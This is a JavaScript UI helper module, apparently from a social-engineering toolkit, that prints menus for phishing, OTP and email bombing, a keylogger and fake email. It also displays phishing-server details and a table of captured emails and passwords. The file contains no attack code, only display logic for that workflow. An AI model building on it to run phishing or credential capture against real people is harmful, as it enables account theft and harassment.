// user interface helpers (banner, menus, status text)
const chalk = require('chalk');

// colour shortcuts
const RED = chalk.red;
const ORANGE = chalk.hex('#FFA500');
const RESET = chalk.reset;

// built-in string padding is used instead of a custom helper


// build and log a big banner string using a single console.log
function printBanner() {
    const text = `
███████╗ ██████╗  ██████╗██╗ █████╗ ██╗     
██╔════╝██╔═══██╗██╔════╝██║██╔══██╗██║     
███████╗██║   ██║██║     ██║███████║██║     
╚════██║██║   ██║██║     ██║██╔══██║██║     
███████║╚██████╔╝╚██████╗██║██║  ██║███████╗
╚══════╝ ╚═════╝  ╚═════╝╚═╝╚═╝  ╚═╝╚══════╝

███████╗███╗   ██╗ ██████╗ ██╗███╗   ██╗███████╗███████╗██████╗ ██╗███╗   ██╗ ██████╗ 
██╔════╝████╗  ██║██╔════╝ ██║████╗  ██║██╔════╝██╔════╝██╔══██╗██║████╗  ██║██╔════╝ 
█████╗  ██╔██╗ ██║██║  ███╗██║██╔██╗ ██║█████╗  █████╗  ██████╔╝██║██╔██╗ ██║██║  ███╗
██╔══╝  ██║╚██╗██║██║   ██║██║██║╚██╗██║██╔══╝  ██╔══╝  ██╔══██╗██║██║╚██╗██║██║   ██║
███████╗██║ ╚████║╚██████╔╝██║██║ ╚████║███████╗███████╗██║  ██║██║██║ ╚████║╚██████╔╝
╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝                                                         
`;
    console.log(chalk.blue(text));
    console.log(chalk.white('                                                           Website: cappriciosec.com'));
    console.log();  
}


function showMainMenu() {
    console.log(`
            ${RED('Main Menu')}
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ ${RED('No.')} ┃ Option                     ┃
┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
│ ${RED('1')}   │ 🎯 Start Phishing Attack   │
│ ${RED('2')}   │ 📲 OTP Bombing             │
│ ${RED('3')}   │ 🎹 Keylogger               │
│ ${RED('4')}   │ 📩 Email Bombing           │
│ ${RED('5')}   │ 📧 Send Fake Email         │
│ ${RED('6')}   │ 🕵️ IP Changer              │
│ ${RED('0')}   │ ❌ Quit                    │
└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
`);
}
function showTemplateMenu(templates) {

    const COL_NO = 4;
    const COL_NAME = 20;

    function fit(text, width) {
        text = String(text || '');
        if (text.length > width) {
            return text.slice(0, width - 1) + '…';
        }
        return text.padEnd(width);
    }

    let lines = [];

    lines.push(`${RED('       Select Template')}${RESET('')}`);

    lines.push(`┏${'━'.repeat(COL_NO+2)}┳${'━'.repeat(COL_NAME+2)}┓`);

    lines.push(
        `┃ ${RED(fit('No.', COL_NO))} ┃ ${RED(fit('Templates', COL_NAME))} ┃`
    );

    lines.push(`┣${'━'.repeat(COL_NO+2)}╋${'━'.repeat(COL_NAME+2)}┫`);

    templates.forEach((t, i) => {
        lines.push(
            `┃ ${RED(fit(i + 1, COL_NO))} ┃ ${fit(t, COL_NAME)} ┃`
        );
    });

    lines.push(`┃ ${RED(fit('0', COL_NO))} ┃ ${fit('Previous Menu', COL_NAME)} ┃`);


    lines.push(`┗${'━'.repeat(COL_NO+2)}┻${'━'.repeat(COL_NAME+2)}┛`);

    console.log(lines.join('\n'));
}

function showPhishingSummary({
    target,
    uuid,
    selected,
    localIp,
    port,
    cloudflaredInstalled,
    targetUrl,
    folder,
    createdAt
}) {

    console.log(chalk.white('[+] New Target Created: ') + chalk.blue(target));
    console.log(chalk.white('[+] ') + chalk.blue(target) + chalk.white(' UUID: ') + chalk.blue(uuid));
    console.log(chalk.white('[+] Template selected: ') + chalk.blue(selected));
    console.log(chalk.white('[+] Admin page URL: ') + chalk.blue('https://cappriciosec.com/socialengineering/'));

    console.log(
        chalk.white('[+] Phishing server running at: ') +
        chalk.blue(`http://${localIp}:${port}/?uuid=${uuid}`)
    );

    if (cloudflaredInstalled) {
        console.log(
            chalk.white('[+] Phishing Target URL: ') +
            chalk.blue(targetUrl)
        );
    } else {
        console.log(chalk.white('[!] cloudflared not installed'));
        console.log(
            chalk.white('[+] Phishing Target URL: ') +
            chalk.blue(targetUrl)
        );
    }

    console.log(chalk.white('[+] Serving files from: ') + chalk.blue(folder));
    console.log(chalk.white('[+] Created At: ') + chalk.blue(createdAt));

    console.log();
    console.log(chalk.white('[+] Enter x or 0 to stop the server'));
    console.log();
    console.log(chalk.white('[✓] Server running on port ') + chalk.blue(port));
    console.log();
}

// print a combined table of log records; meta information is shown once before
function showCredsTable(meta, records) {
    if (!Array.isArray(records) || records.length === 0) return;

    const COL_EMAIL = 30;
    const COL_PASS = 20;
    const COL_IP = 15;
    const COL_UA = 40;
    const COL_TIME = 20;

    const TABLE_WIDTH = COL_EMAIL + COL_PASS + COL_IP + COL_UA + COL_TIME + 14;

    function fit(text, width) {
        text = String(text || '');
        if (text.length > width) {
            return text.slice(0, width - 1) + '…';
        }
        return text.padEnd(width);
    }

    function line(width) {
        return '━'.repeat(width);
    }

    /* ---------------- META BOX ---------------- */

    if (meta) {
        let metaLines = [];

        metaLines.push(`┏${line(59)}┓`);
        metaLines.push(`┃ ${RED('Captured Credentials - Meta Info       ').padEnd(67)} ┃`);
        metaLines.push(`┣${line(59)}┫`);

        if (meta.target) metaLines.push(`┃ Target      : ${fit(meta.target, 43)} ┃`);
        if (meta.template) metaLines.push(`┃ Template    : ${fit(meta.template, 43)} ┃`);
        if (meta.uuid) metaLines.push(`┃ UUID        : ${fit(meta.uuid, 43)} ┃`);
        if (meta.localIp) metaLines.push(`┃ Local IP    : ${fit(meta.localIp, 43)} ┃`);
        if (meta.targetUrl) metaLines.push(`┃ Tunnel URL  : ${fit(meta.targetUrl, 43)} ┃`);

        metaLines.push(`┗${line(59)}┛`);
        metaLines.push('');

        console.log(metaLines.join('\n'));
    }

    /* ---------------- TABLE ---------------- */

    let lines = [];

    lines.push(`┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━┓`);


    lines.push(
        `┃ ` +
        RED(fit('Email', COL_EMAIL)) + ` ┃ ` +
        RED(fit('Password', COL_PASS)) + ` ┃ ` +
        RED(fit('IP', COL_IP)) + ` ┃ ` +
        RED(fit('User-Agent', COL_UA)) + ` ┃` +
        RED(fit('Timestamp', COL_TIME)) + `  ┃`
    );

    lines.push(
        `┣${line(COL_EMAIL+2)}╋${line(COL_PASS+2)}╋${line(COL_IP+2)}╋${line(COL_UA+2)}╋${line(COL_TIME+2)}┫`
    );

    records.forEach(r => {

        const email = fit(r.email, COL_EMAIL);
        const pass = fit(r.password, COL_PASS);
        const ip = fit(r.ip, COL_IP);
        const ua = fit(r.useragent || r['user-agent'], COL_UA);
        const ts = fit(formatDate(r.timestamp) || formatDate(r.ts), COL_TIME);

        lines.push(
            `┃ ${email} ┃ ${pass} ┃ ${ip} ┃ ${ua} ┃ ${ts} ┃`
        );
    });

    lines.push(`┗${line(TABLE_WIDTH)}┛`);
    lines.push('');

    console.log(lines.join('\n'));
}

function clearScreen() {
    // cross-platform clear
    process.stdout.write('\x1Bc');
}

function showAttackMenu() {
    // static version using a template literal
    const text = `
${RED('     Phishing Menu')}${RESET('')}
┏━━━━━┳━━━━━━━━━━━━━━━━━━━━━┓
┃ ${RED('No.')}${RESET('')} ┃ Option              ┃
┡━━━━━╇━━━━━━━━━━━━━━━━━━━━━┩
│${RED(' 1   ')}${RESET('')}│➕ Start New Attack  │
│${RED(' 2   ')}${RESET('')}│🔁 Resume Attack     │
│${RED(' 3   ')}${RESET('')}│📂 View Credentials  │
│${RED(' 0   ')}${RESET('')}│🔙 Back to main menu │
└─────┴─────────────────────┘
`;
    console.log(text);
}


function formatDate(datetime) {
    const d = new Date(datetime);

    const day = String(d.getDate()).padStart(2, '0');
    const months = ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"];
    const month = months[d.getMonth()];
    const year = d.getFullYear();

    const hour = String(d.getHours()).padStart(2, '0');
    const min = String(d.getMinutes()).padStart(2, '0');

    return `${day} ${month} ${year} ${hour}:${min}`;
}


function showAttackList(attacks) {
    if (!Array.isArray(attacks) || attacks.length === 0) return;

    const COL_NO = 4;
    const COL_NAME = 16;
    const COL_UUID = 38;
    const COL_TEMPLATE = 20;
    const COL_DATE = 20;

    const TOTAL_WIDTH =
        COL_NO + COL_NAME + COL_UUID + COL_TEMPLATE + COL_DATE + 6;

    function fit(text, width) {
        text = String(text);
        if (text.length > width) {
            return text.slice(0, width - 1) + "…";
        }
        return text.padEnd(width);
    }

    function center(text, width) {
        text = String(text);
        const left = Math.floor((width - text.length) / 2);
        const right = width - text.length - left;
        return " ".repeat(left) + text + " ".repeat(right);
    }
    
    let lines = [];

    lines.push(`\n${RED(' Select Existing Target')}\n`);

    lines.push(`┏━━━━┳━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━┓`);

    // Header
    lines.push(
        `┃ ${RED(fit('No', COL_NO - 1))}` +
        `┃ ${RED(fit('Name', COL_NAME))}` +
        `┃ ${RED(fit('UUID', COL_UUID))}` +
        `┃ ${RED(fit('Template', COL_TEMPLATE))}` +
        `┃ ${RED(fit('Created At', COL_DATE))}┃`
    );

    lines.push(`┣━━━━╋━━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━━━━━━┫`);

    attacks.forEach((atk, i) => {
        lines.push(
            `┃ ${RED(fit(i + 1, COL_NO - 1))}` +
            `┃ ${ORANGE(fit(atk.name, COL_NAME))}` +
            `┃ ${fit(atk.uuid, COL_UUID)}` +
            `┃ ${fit(atk.template, COL_TEMPLATE)}` +
            `┃ ${fit(formatDate(atk.datetime), COL_DATE)}┃`
        );
    });

    // Bottom border
    lines.push(`┗━━━━┻━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━┛`);

    console.log(lines.join('\n'));
}

module.exports = {
    printBanner,
    showMainMenu,
    showAttackMenu,
    showTemplateMenu,
    showAttackList,
    showPhishingSummary,
    showCredsTable,
    clearScreen
};
